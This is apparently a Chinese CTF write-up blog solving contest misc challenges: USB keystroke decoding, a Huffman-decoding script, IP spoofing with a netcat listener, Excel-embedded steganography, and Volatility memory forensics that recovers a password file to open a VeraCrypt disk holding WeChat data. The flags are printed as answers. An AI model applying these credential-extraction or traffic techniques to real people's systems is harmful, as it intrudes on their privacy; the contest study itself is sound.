class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000060000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000050000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000250000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">00002a0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000250000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000270000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000270000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000070000000000</span><br></pre></td></tr></table></figure><p>USB Keyboard Data Hacker 跑一下可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b3866396564326639333365662&lt;DEL&gt;31346138643035323364303334396531323939637d</span><br></pre></td></tr></table></figure><p>将数据整理成如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b38663965643266393333656631346138643035323364303334396531323939637d</span><br></pre></td></tr></table></figure><p>再 <code>From Hex</code> 即可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;</span><br></pre></td></tr></table></figure><h3 id="歪比歪比"><a href="#歪比歪比" class="headerlink" title="歪比歪比"></a>歪比歪比</h3><p>附件给出的 data 很明显是流量包，使用 Wireshark 分析，跟踪 TCP 流。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617516627746.2bb321fbe2bf4f220f0e679d964eee3f8d96eb71.png"></p><p>很容易看出是哈夫曼编码，网上找一段代码解码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计字符出现频率，生成映射表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_frequency</span>(<span class="params">text</span>):</span></span><br><span class="line">    chars = []</span><br><span class="line">    ret = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            chars.append(char)</span><br><span class="line">            ret.append((char, text.count(char)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, frequency</span>):</span></span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line">        self.father = <span class="literal">None</span></span><br><span class="line">        self.frequency = frequency</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_left</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.father.left == self</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建叶子节点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_nodes</span>(<span class="params">frequency_list</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [Node(frequency) <span class="keyword">for</span> frequency <span class="keyword">in</span> frequency_list]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Huffman树</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_huffman_tree</span>(<span class="params">nodes</span>):</span></span><br><span class="line">    queue = nodes[:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(queue) &gt; <span class="number">1</span>:</span><br><span class="line">        queue.sort(key=<span class="keyword">lambda</span> item: item.frequency)</span><br><span class="line">        node_left = queue.pop(<span class="number">0</span>)</span><br><span class="line">        node_right = queue.pop(<span class="number">0</span>)</span><br><span class="line">        node_father = Node(node_left.frequency + node_right.frequency)</span><br><span class="line">        node_father.left = node_left</span><br><span class="line">        node_father.right = node_right</span><br><span class="line">        node_left.father = node_father</span><br><span class="line">        node_right.father = node_father</span><br><span class="line">        queue.append(node_father)</span><br><span class="line"></span><br><span class="line">    queue[<span class="number">0</span>].father = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> queue[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Huffman编码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">huffman_encoding</span>(<span class="params">nodes, root</span>):</span></span><br><span class="line">    huffman_code = [<span class="string">&#x27;&#x27;</span>] * <span class="built_in">len</span>(nodes)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nodes)):</span><br><span class="line">        node = nodes[i]</span><br><span class="line">        <span class="keyword">while</span> node != root:</span><br><span class="line">            <span class="keyword">if</span> node.is_left():</span><br><span class="line">                huffman_code[i] = <span class="string">&#x27;0&#x27;</span> + huffman_code[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                huffman_code[i] = <span class="string">&#x27;1&#x27;</span> + huffman_code[i]</span><br><span class="line">            node = node.father</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> huffman_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码整个字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_str</span>(<span class="params">text, char_frequency, codes</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> char_frequency:</span><br><span class="line">            <span class="keyword">if</span> char == item[<span class="number">0</span>]:</span><br><span class="line">                ret += codes[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码整个字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_str</span>(<span class="params">huffman_str, char_frequency, codes</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> huffman_str != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> codes:</span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">in</span> huffman_str <span class="keyword">and</span> huffman_str.index(item) == <span class="number">0</span>:</span><br><span class="line">                ret += char_frequency[i][<span class="number">0</span>]</span><br><span class="line">                huffman_str = huffman_str[<span class="built_in">len</span>(item):]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># text = raw_input(&#x27;The text to encode:&#x27;)</span></span><br><span class="line">    huf_text = <span class="string">&quot;HUFFMAN_ENCODED_TEXT&quot;</span></span><br><span class="line">    char_frequency = [(<span class="string">&#x27;j&#x27;</span>, <span class="number">29</span>), (<span class="string">&#x27;z&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;7&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;l&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;6&#x27;</span>, <span class="number">37</span>), (<span class="string">&#x27;4&#x27;</span>, <span class="number">32</span>), (<span class="string">&#x27;p&#x27;</span>, <span class="number">38</span>), (<span class="string">&#x27;h&#x27;</span>, <span class="number">27</span>),(<span class="string">&#x27;g&#x27;</span>, <span class="number">26</span>), (<span class="string">&#x27;x&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;i&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="number">27</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;8&#x27;</span>, <span class="number">36</span>), (<span class="string">&#x27;0&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;o&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>),(<span class="string">&#x27;y&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="number">29</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">26</span>), (<span class="string">&#x27;m&#x27;</span>, <span class="number">27</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;v&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;d&#x27;</span>, <span class="number">33</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;9&#x27;</span>, <span class="number">33</span>),(<span class="string">&#x27;t&#x27;</span>, <span class="number">21</span>), (<span class="string">&#x27;w&#x27;</span>, <span class="number">22</span>), (<span class="string">&#x27;a&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;r&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;s&#x27;</span>, <span class="number">16</span>), (<span class="string">&#x27;k&#x27;</span>, <span class="number">32</span>), (<span class="string">&#x27;5&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;q&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="number">32</span>),(<span class="string">&#x27;&#123;&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;-&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;&#125;&#x27;</span>, <span class="number">1</span>)]</span><br><span class="line">    nodes = create_nodes([item[<span class="number">1</span>] <span class="keyword">for</span> item <span class="keyword">in</span> char_frequency])</span><br><span class="line">    root = create_huffman_tree(nodes)</span><br><span class="line">    codes = huffman_encoding(nodes, root)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># huffman_str = encode_str(text, char_frequency, codes)</span></span><br><span class="line">    origin_str = decode_str(huf_text, char_frequency, codes)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print &#x27;Encode result:&#x27; + huffman_str</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Decode result:&#x27;</span> + origin_str</span><br></pre></td></tr></table></figure><p>运行脚本得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode result:jz7ezl64pjhgx6iun78roljc01bm72vjr7u44dfh9tewz8auzmzdzypet4d9xcehxspktdcgxgeeybmgva5pp9850b9mceifedlos6rehy8isvpzf6u545y50c4y9avuvqq3g1epi6igd6tciby7hep9o33cm3guo4qvcxqpcg6zdi5i1r6mmj6xcq5ummzm6jiniidbn51kppj15dp3zy4o8pww23kggukjrytosbkx8th00zba777e0kkz9e1te3u5i36fiym3pran1zgp2a192x63mnc35dhocqli21s2qby9htvdp82x9t6ai0n0wkvbl080bj3xzpj5m8a3jn67kh0le8v104lwa155n8n5o7y97ypdw6hv7d6rbkppxb3ktxnhttb29zsehww2u2x0fhb2k2p1uafhwrfgx7vha64xjr2ffewd30n9961ozt8dgdikly8cknf36kbh2chj28xrencflag&#123;5rd477a2-6r36-dra9-9d63-49c2e9e5d1e5&#125;f43x61l9v3de9z0hiwfz30l1keik5vx48m4yrausvae6fq1q7b9yb4s4tzqbbkyy2hizvqg26spral8rkz37cuylk1k0wfy8p4zppjujggcvpv9e0nhfopumxecd4zbo5sc76zpx8kvttaohud4ltdw16vmgfgucfw2nnafkuup4a6sgkxpk4nw0ax65j6w2498qoap2pqf4el1tu79k6jagxq4q7injr6pkz8yroz25ymdv7uq8h3k24mgf63gmld1i1jga7yupef74l95xr11l1yemjscrn313u89ilrpm8cfj8x826igbfmfnw98qdkm8i3z1vj8ajsebab9w9afhaccvd8qsv2u8zcohp6bxkjonpfoio896q01vje9o2jp00snunzj6zandlq7l8hldsct3ha4dawq9lq8t3u34fmkxrmwd8o4tmow3028o1rqcjzkg9mubjwr5byx7hn44o38vd50</span><br></pre></td></tr></table></figure><p>此时其中包含有 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5rd477a2-6r36-dra9-9d63-49c2e9e5d1e5&#125;</span><br></pre></td></tr></table></figure><p>但是需要注意的是，<code>(&#39;r&#39;, 24),(&#39;0&#39;, 24)</code> 两个字母的词频是一样的，因此实际上有两种解法，剩余的一种如下。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;50d477a2-6036-d0a9-9d63-49c2e9e5d1e5&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF 2021</title>
      <link href="/zh-CN/posts/827bc0ca.html"/>
      <url>/zh-CN/posts/827bc0ca.html</url>
      
        <content type="html"><![CDATA[<h3 id="我是间谍2nd"><a href="#我是间谍2nd" class="headerlink" title="我是间谍2nd"></a>我是间谍2nd</h3><blockquote><p>remember: try to forgery ip,but not to reverse it.</p></blockquote><p>根据提示得知需要伪造 IP，此处因为需要终端交互，所以使用环回适配器不是个很好的方案。最方便的办法是直接把物理网卡当前连接的 IPv4 地址直接改成 223.223.223.223。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f103c270-2858-4c57-870f-e1631d283880/1616214874795.f303f01690f2350557e593c85898c68c2a76ec58.png"></p><p>此时在控制台使用 Netcat 监听程序需要连接交互的 6001 端口。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">nc -lvvp 6001</span></span><br></pre></td></tr></table></figure><p>启动程序可见如下回显。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connecting to 223.223.223.223:6001</span><br><span class="line">send one character of flag to server....</span><br><span class="line">wait for reply from server....</span><br></pre></td></tr></table></figure><p>此时在监听处输入任意字符回车即可接续交互，往复执行可逐位获得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;XVlBzgbaiCMRAjWwhTHctcuAxhxKQFDaFpLSjFbcXoEF&#125;</span><br></pre></td></tr></table></figure><h3 id="出题人日记"><a href="#出题人日记" class="headerlink" title="出题人日记"></a>出题人日记</h3><p>附件的 Excel 文件使用解压软件打开可得如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hint:</span><br><span class="line">隐写.wf pna fbyir guvf ceboyrz</span><br><span class="line"></span><br><span class="line">[ROT13]</span><br><span class="line">js can solve this problem</span><br></pre></td></tr></table></figure><p>在 Excel 文件的 <code>xl/media/</code> 下可发现文件拓展名被修改的 <code>fufufufufufufufufuufufufufufufufufufufufufufufufufu.flag</code>，修正其拓展名为 <code>.png</code>。使用 Stegsolve 查看图片，可发现图片的 Alpha 通道下可能存有数据，且 Data Extract 无法提取出有效内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f103c270-2858-4c57-870f-e1631d283880/1616219266024.c76234c67451f657b60f6494d84abef93fdf7c7f.png"></p><p>结合 hint 可以找到如下项目。按照使用方法操作即可得 flag。</p><blockquote><p>GitHub Repo: <a href="https://github.com/metallurgical/LSB-steganography-javascript">https://github.com/metallurgical/LSB-steganography-javascript</a></p></blockquote><p><img src="https://butter.lumosary.workers.dev/images/archive/f103c270-2858-4c57-870f-e1631d283880/1616219433496.c9bca5fdce587ff1ea7a8777ee201451d2f5136b.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;D4La0_s0lve_th1s_probl3m_to_hit_c4ij1&#125;</span><br></pre></td></tr></table></figure><h3 id="我没有py"><a href="#我没有py" class="headerlink" title="我没有py"></a>我没有py</h3><h4 id="内存取证获得密码"><a href="#内存取证获得密码" class="headerlink" title="内存取证获得密码"></a>内存取证获得密码</h4><p>volatility2 跑 imageinfo，得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (&#x2F;mnt&#x2F;f&#x2F;ghrepos&#x2F;volatility2&#x2F;WIN-MREMF575OV9-20210317-081823.raw)</span><br><span class="line">                      PAE type : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf800040410a0L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR for CPU 0 : 0xfffff80004042d00L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2021-03-17 08:18:25 UTC+0000</span><br><span class="line">     Image local date and time : 2021-03-17 16:18:25 +0800</span><br></pre></td></tr></table></figure><p>再 filescan 可以找出如下重点内容，同时关注到文件中包含微信的文件。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000007fb79730     16      0 RW-r-- \Device\HarddiskVolume1\Users\rr\Desktop\密码.txt</span><br></pre></td></tr></table></figure><p>将这个文件使用 dumpfiles 提取出来可以得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I_didn&#39;t_py</span><br></pre></td></tr></table></figure><p>使用 VeraCrypt 配合得到的密码挂载附件中所给的虚拟磁盘，可以得到一份完整的微信帐号文件。</p><h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p>写着写着听说出了非预期，想到了之前的 Ant X D3CTF 的 VMware 的非预期。稍微搜索了一下，真的能搜到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;sharun_Aka_xiaokeai！&#125;</span><br></pre></td></tr></table></figure><h3 id="冰峰历险记"><a href="#冰峰历险记" class="headerlink" title="冰峰历险记"></a>冰峰历险记</h3><p>启动游戏可以发现其图标是 Electron 的图标，使用 <code>Ctrl + Shift + I</code> 可以唤出开发者工具。在 Console 下可以看到一个警告，其中包含了游戏资源释放的路径。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f103c270-2858-4c57-870f-e1631d283880/1616244869689.84375cd9f4f55be56607602c34d1da106b6d53bb.png"> </p><p>定向到相关的目录可以看到这个 Electron 程序的结构。可以发现其主要是使用 JS 驱动的，于是尝试在控制台尝试相关关键字。执行 <code>win()</code> 函数后可以发现游戏画面直接跳转到了结束并要求输入密码解锁箱子的画面。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f103c270-2858-4c57-870f-e1631d283880/1616245077825.1829b12449ef32c34203ef253ef5f5be08d65692.png"></p><p>此时在页面可以找到一段内联 JS，稍加整理后得到如下代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onButtonClick</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> _0x3771 = [</span><br><span class="line"><span class="string">&#x27;ble&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ratu&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;39F2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1LIJveh&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;23nyOSum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;16MBsizm&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;4dMPsHS&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;-1DE&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;73294VUMRxR&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;4AE1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1161887UPGDlh&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;3609&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;font&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;8DC3&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Size&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;6D6-&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cong&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;23kcMzKe&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;E558&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;156525dPfREI&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;styl&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;lati&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;5cBLINZ&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;55739hrmAsl&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Nep&#123;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;68858hnUPCt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;109961hCoEny&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;visi&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ons!&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;46051FfapOI&#x27;</span>,</span><br><span class="line"><span 